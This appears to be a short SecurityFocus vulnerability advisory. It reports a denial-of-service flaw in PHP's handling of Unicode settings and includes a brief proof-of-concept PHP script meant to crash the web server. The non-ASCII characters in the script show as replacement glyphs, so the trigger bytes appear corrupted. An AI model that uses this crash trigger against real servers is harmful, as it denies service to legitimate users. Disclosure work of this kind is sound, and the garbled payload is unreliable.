source: http://www.securityfocus.com/bid/33542/info

PHP is prone to a denial-of-service vulnerability because it fails to limit global scope for certain settings relating to Unicode text operations.

Attackers can exploit this issue to crash the affected webserver, denying service to legitimate users. 

<?php
        $v = '���� � ����|test.php';
        print substr($v,0,strpos($v,'|'));
?>